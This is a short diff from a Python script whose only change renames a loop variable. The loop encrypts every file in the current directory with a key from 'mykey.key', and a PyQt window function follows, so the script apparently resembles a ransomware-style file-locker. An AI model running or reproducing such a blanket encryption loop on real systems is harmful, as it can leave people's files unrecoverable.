@@ -32,9 +32,9 @@ def getListOfFiles(dirName):
 
     return allFiles
 
-for f in listdir():
+for f2 in listdir():
     fkey = open("mykey.key","rb")
-    encrypt(f, fkey.read())
+    encrypt(f2, fkey.read())
 def window():
     app = QApplication(sys.argv)
     widget = QWidget()
